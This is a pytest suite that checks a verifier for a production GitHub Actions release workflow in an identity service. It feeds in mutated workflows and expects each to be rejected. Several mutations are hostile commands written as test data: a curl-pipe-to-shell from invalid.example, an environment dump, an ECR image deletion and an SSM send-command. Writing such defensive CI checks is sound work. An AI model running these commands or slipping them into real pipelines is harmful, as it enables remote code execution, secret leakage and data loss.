from __future__ import annotations

import shutil
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path

import pytest
import yaml  # type: ignore[import-untyped]

from scripts import check_release_workflow

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW_PATH = ROOT / ".github" / "workflows" / "release-production.yml"
API_DOCKERFILE = ROOT / "Dockerfile"
BFF_DOCKERFILE = ROOT / "examples" / "reference_bff" / "Dockerfile"
WORKFLOW_SOURCE = WORKFLOW_PATH.read_text(encoding="utf-8")


def replace_all(old: str, new: str) -> Callable[[str], str]:
    def mutate(source: str) -> str:
        assert old in source
        return source.replace(old, new)

    return mutate


def replace_first(old: str, new: str) -> Callable[[str], str]:
    def mutate(source: str) -> str:
        assert source.count(old) >= 1
        return source.replace(old, new, 1)

    return mutate


MUTATIONS: tuple[tuple[str, Callable[[str], str]], ...] = (
    ("push-trigger", replace_first("  workflow_dispatch: {}", "  push: {}")),
    (
        "dispatch-input",
        replace_first(
            "  workflow_dispatch: {}",
            "  workflow_dispatch:\n    inputs:\n      tag:\n        required: false",
        ),
    ),
    ("arbitrary-ref", replace_all("refs/heads/main", "refs/heads/release")),
    ("different-repository", replace_all("rahulyadev/identity-service", "other/project")),
    ("self-hosted-runner", replace_all("ubuntu-24.04", "self-hosted")),
    ("wrong-environment", replace_first("environment: production", "environment: staging")),
    ("wrong-account", replace_all("402906459349", "111122223333")),
    ("wrong-region", replace_all("ap-south-1", "us-east-1")),
    (
        "wrong-role",
        replace_all(
            "platform-infrastructure-production-identity-deployer",
            "unreviewed-role",
        ),
    ),
    (
        "wrong-registry",
        replace_all("dkr.ecr.ap-south-1.amazonaws.com", "dkr.ecr.us-east-1.amazonaws.com"),
    ),
    (
        "wrong-api-repository",
        replace_all("platform-infrastructure-production-identity-api", "identity-api"),
    ),
    (
        "wrong-bff-repository",
        replace_all("platform-infrastructure-production-identity-bff", "identity-bff"),
    ),
    (
        "wrong-dockerfile",
        replace_all("file: Dockerfile", "file: examples/reference_bff/Dockerfile"),
    ),
    ("wrong-target", replace_first("target: runtime", "target: test")),
    ("wrong-platform", replace_all("linux/arm64", "linux/amd64")),
    ("missing-validation-dependency", replace_first("needs: validate", "needs: []")),
    ("partial-validation", replace_first("run: make validate", "run: make test-unit")),
    (
        "validation-oidc",
        replace_first(
            "      contents: read\n    steps:",
            "      contents: read\n      id-token: write\n    steps:",
        ),
    ),
    (
        "long-lived-secret",
        replace_first(
            "      contents: read\n    steps:",
            "      contents: read\n"
            "    env:\n"
            "      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n"
            "    steps:",
        ),
    ),
    ("broad-permission", replace_first("contents: read", "contents: write")),
    (
        "floating-action",
        replace_first(
            "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0",
            "actions/checkout@v7",
        ),
    ),
    ("unofficial-action", replace_first("actions/checkout@", "untrusted/checkout@")),
    ("curl-pipe", replace_first("run: make sync", "run: curl https://invalid.example | sh")),
    ("runtime-install", replace_first("run: make sync", "run: pip install unreviewed")),
    (
        "mutable-tag",
        replace_first(
            "sha-${{ github.sha }}-run-${{ github.run_id }}-attempt-${{ github.run_attempt }}",
            "latest",
        ),
    ),
    (
        "short-tag",
        replace_first(
            "sha-${{ github.sha }}-run-${{ github.run_id }}-attempt-${{ github.run_attempt }}",
            "sha-${{ github.sha }}",
        ),
    ),
    (
        "user-tag",
        replace_first(
            "sha-${{ github.sha }}-run-${{ github.run_id }}-attempt-${{ github.run_attempt }}",
            "${{ inputs.tag }}",
        ),
    ),
    ("digest-free-manifest", replace_first("@{api_digest}", ":{api_digest}")),
    (
        "swapped-image-mapping",
        replace_all("file: Dockerfile", "file: examples/reference_bff/Dockerfile"),
    ),
    ("push-during-prebuild", replace_all("push: false", "push: true")),
    ("sbom-disabled", replace_all("sbom: true", "sbom: false")),
    ("provenance-reduced", replace_all("provenance: mode=max", "provenance: mode=min")),
    (
        "attestation-unbound",
        replace_first(
            "subject-digest: ${{ steps.push-api.outputs.digest }}",
            "subject-digest: sha256:"
            "0000000000000000000000000000000000000000000000000000000000000000",
        ),
    ),
    ("long-retention", replace_first("retention-days: 7", "retention-days: 90")),
    (
        "trace",
        replace_first("run: make validate", "run: |\n          set -x\n          make validate"),
    ),
    ("environment-dump", replace_first("run: make validate", "run: printenv")),
    ("ssm-command", replace_first("run: make validate", "run: aws ssm send-command")),
    ("deploy-command", replace_first("run: make validate", "run: deploy production")),
    (
        "image-delete",
        replace_first("run: make validate", "run: aws ecr batch-delete-image"),
    ),
    (
        "partial-marked-deployable",
        replace_first("Release state: `NOT_DEPLOYABLE`", "Release state: `DEPLOYABLE`"),
    ),
    (
        "partial-report-disabled",
        replace_first(
            "if: ${{ failure() && steps.push-api.outputs.digest != '' }}",
            "if: ${{ false }}",
        ),
    ),
    ("missing-action-version-comment", replace_first(" # v7.0.0", "")),
)


def test_release_workflow_positive_contract() -> None:
    workflow = check_release_workflow.verify_repository()

    assert workflow["on"] == {"workflow_dispatch": {}}
    assert workflow["permissions"] == {}
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert tuple(jobs) == ("validate", "release")
    validate = jobs["validate"]
    release = jobs["release"]
    assert isinstance(validate, dict)
    assert isinstance(release, dict)
    assert validate["permissions"] == {"contents": "read"}
    assert "environment" not in validate
    assert release["needs"] == "validate"
    assert release["environment"] == "production"
    assert release["permissions"] == {
        "contents": "read",
        "id-token": "write",
        "attestations": "write",
    }
    assert release["env"]["RELEASE_TAG"] == (
        "sha-${{ github.sha }}-run-${{ github.run_id }}-attempt-${{ github.run_attempt }}"
    )
    assert tuple(step["name"] for step in validate["steps"]) == (
        check_release_workflow.VALIDATE_STEP_ORDER
    )
    assert tuple(step["name"] for step in release["steps"]) == (
        check_release_workflow.RELEASE_STEP_ORDER
    )

    manifest_step = next(
        step for step in release["steps"] if step["name"] == "Write bounded release manifest"
    )
    manifest_command = manifest_step["run"]
    for field in (
        '"schema_version"',
        '"repository"',
        '"source_sha"',
        '"workflow"',
        '"platform"',
        '"images"',
        '"reference"',
        '"sbom"',
        '"provenance"',
        '"attestation"',
    ):
        assert field in manifest_command
    assert "sha256:[0-9a-f]{64}" in manifest_command
    assert "linux/arm64" in manifest_command


def test_strict_loader_preserves_yaml_12_key_and_boolean_semantics() -> None:
    assert issubclass(check_release_workflow.StrictLoader, yaml.SafeLoader)

    parsed = check_release_workflow.parse_workflow_source(
        "on:\n  enabled: true\n  disabled: false\nlegacy_yes: yes\nlegacy_on: on\n"
    )

    assert parsed == {
        "on": {"enabled": True, "disabled": False},
        "legacy_yes": "yes",
        "legacy_on": "on",
    }


@pytest.mark.parametrize(
    ("source", "expected_code"),
    (
        ("root:\n  item: DO_NOT_DISCLOSE\n  item: other\n", "yaml-duplicate-key"),
        ("root: &DO_NOT_DISCLOSE {}\n", "yaml-indirection"),
        ("root: *DO_NOT_DISCLOSE\n", "yaml-indirection"),
        ("root:\n  <<: DO_NOT_DISCLOSE\n", "yaml-merge"),
        ("---\nroot: DO_NOT_DISCLOSE\n---\nroot: other\n", "workflow-yaml"),
        (
            "root: !!python/object/apply:builtins.str [DO_NOT_DISCLOSE]\n",
            "workflow-yaml",
        ),
    ),
    ids=("duplicate", "anchor", "alias", "merge", "multiple-documents", "python-object"),
)
def test_strict_loader_rejects_ambiguous_or_unsafe_yaml_value_free(
    source: str,
    expected_code: str,
) -> None:
    with pytest.raises(check_release_workflow.ContractError) as captured:
        check_release_workflow.parse_workflow_source(source)

    assert captured.value.code == expected_code
    assert str(captured.value) == expected_code
    assert "DO_NOT_DISCLOSE" not in str(captured.value)


def test_strict_loader_is_disposed_after_success(monkeypatch: pytest.MonkeyPatch) -> None:
    dispose_calls: list[check_release_workflow.StrictLoader] = []
    original_dispose = check_release_workflow.StrictLoader.dispose

    def tracked_dispose(loader: check_release_workflow.StrictLoader) -> None:
        dispose_calls.append(loader)
        original_dispose(loader)

    monkeypatch.setattr(check_release_workflow.StrictLoader, "dispose", tracked_dispose)

    assert check_release_workflow._strict_safe_load("on: true\n") == {"on": True}
    assert len(dispose_calls) == 1


def test_strict_loader_is_disposed_after_failure(monkeypatch: pytest.MonkeyPatch) -> None:
    dispose_calls: list[check_release_workflow.StrictLoader] = []
    original_dispose = check_release_workflow.StrictLoader.dispose

    def tracked_dispose(loader: check_release_workflow.StrictLoader) -> None:
        dispose_calls.append(loader)
        original_dispose(loader)

    monkeypatch.setattr(check_release_workflow.StrictLoader, "dispose", tracked_dispose)

    with pytest.raises(yaml.YAMLError):
        check_release_workflow._strict_safe_load("---\nroot: one\n---\nroot: two\n")
    assert len(dispose_calls) == 1


def test_verifier_source_uses_only_explicit_safe_loader_lifecycle() -> None:
    verifier_source = Path(check_release_workflow.__file__).read_text(encoding="utf-8")

    assert verifier_source.count("loader = StrictLoader(source)") == 1
    assert verifier_source.count("loader.get_single_data()") == 1
    assert verifier_source.count("loader.dispose()") == 1
    for banned_shape in (
        "yaml.load(",
        "unsafe_load",
        "full_load",
        "FullLoader",
        "UnsafeLoader",
        "# nosec",
    ):
        assert banned_shape not in verifier_source


def test_every_external_docker_stage_uses_one_pinned_multiarch_base() -> None:
    api_source = API_DOCKERFILE.read_text(encoding="utf-8")
    bff_source = BFF_DOCKERFILE.read_text(encoding="utf-8")

    check_release_workflow.verify_dockerfile_sources(api_source, bff_source)
    assert api_source.count(check_release_workflow.BASE_IMAGE) == 2
    assert bff_source.count(check_release_workflow.BASE_IMAGE) == 2


@pytest.mark.parametrize(("case", "mutation"), MUTATIONS, ids=[case for case, _ in MUTATIONS])
def test_workflow_widening_mutations_fail_closed(case: str, mutation: Callable[[str], str]) -> None:
    del case
    with pytest.raises(check_release_workflow.ContractError):
        check_release_workflow.verify_workflow_source(mutation(WORKFLOW_SOURCE))


@pytest.mark.parametrize(
    "mutation",
    (
        replace_first("permissions: {}", "permissions: {}\npermissions: {}"),
        replace_first("permissions: {}", "permissions: &shared {}"),
        replace_first("permissions: {}", "permissions:\n  <<: {}"),
        replace_first("run: make sync", "run: [make, sync]"),
        replace_first("workflow_dispatch: {}", "workflow_dispatch: ["),
    ),
    ids=("duplicate", "anchor", "merge", "non-string-run", "malformed"),
)
def test_yaml_ambiguity_and_non_string_commands_are_rejected(
    mutation: Callable[[str], str],
) -> None:
    with pytest.raises(check_release_workflow.ContractError):
        check_release_workflow.verify_workflow_source(mutation(WORKFLOW_SOURCE))


@pytest.mark.parametrize(
    ("path", "replacement"),
    (
        (API_DOCKERFILE, "python:3.14.4-slim-bookworm"),
        (API_DOCKERFILE, check_release_workflow.BASE_IMAGE.replace("python:", "mirror/python:")),
        (
            BFF_DOCKERFILE,
            check_release_workflow.BASE_IMAGE.replace(
                "fc74d22ffd0d5ac395a4b7bdda75a4539758862c49ebf3005647084631e63789",  # pragma: allowlist secret  # noqa: E501
                "0" * 64,
            ),
        ),
    ),
    ids=("mutable", "mirror", "wrong-digest"),
)
def test_base_image_mutations_are_rejected(path: Path, replacement: str) -> None:
    api_source = API_DOCKERFILE.read_text(encoding="utf-8")
    bff_source = BFF_DOCKERFILE.read_text(encoding="utf-8")
    if path == API_DOCKERFILE:
        api_source = api_source.replace(check_release_workflow.BASE_IMAGE, replacement)
    else:
        bff_source = bff_source.replace(check_release_workflow.BASE_IMAGE, replacement)

    with pytest.raises(check_release_workflow.ContractError):
        check_release_workflow.verify_dockerfile_sources(api_source, bff_source)


def test_cli_failure_is_short_and_value_free(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    marker = "DO_NOT_DISCLOSE_MUTATED_VALUE"
    workflow = tmp_path / "release-production.yml"
    workflow.write_text(WORKFLOW_SOURCE.replace(check_release_workflow.REPOSITORY, marker))
    monkeypatch.setattr(check_release_workflow, "WORKFLOW_PATH", workflow)
    monkeypatch.setattr(sys, "argv", ["check_release_workflow.py"])

    assert check_release_workflow.main() == 1
    captured = capsys.readouterr()
    assert captured.out == ""
    assert captured.err.startswith("release workflow contract failed: ")
    assert marker not in captured.err
    assert len(captured.err) < 100


@pytest.mark.parametrize(
    ("case", "mutation"),
    (
        MUTATIONS[0],
        MUTATIONS[5],
        MUTATIONS[17],
        MUTATIONS[20],
        MUTATIONS[30],
        MUTATIONS[32],
        MUTATIONS[36],
        MUTATIONS[40],
    ),
)
def test_disposable_cli_mutation_probes(
    case: str,
    mutation: Callable[[str], str],
    tmp_path: Path,
) -> None:
    fixture = tmp_path / case
    (fixture / ".github" / "workflows").mkdir(parents=True)
    (fixture / "scripts").mkdir()
    (fixture / "examples" / "reference_bff").mkdir(parents=True)
    shutil.copy2(check_release_workflow.__file__, fixture / "scripts" / "check_release_workflow.py")
    shutil.copy2(API_DOCKERFILE, fixture / "Dockerfile")
    shutil.copy2(BFF_DOCKERFILE, fixture / "examples" / "reference_bff" / "Dockerfile")
    (fixture / ".github" / "workflows" / "release-production.yml").write_text(
        mutation(WORKFLOW_SOURCE),
        encoding="utf-8",
    )

    result = subprocess.run(
        [sys.executable, str(fixture / "scripts" / "check_release_workflow.py")],
        cwd=fixture,
        check=False,
        capture_output=True,
        text=True,
        shell=False,
    )

    assert result.returncode == 1
    assert result.stdout == ""
    assert result.stderr.startswith("release workflow contract failed: ")
    assert len(result.stderr) < 100
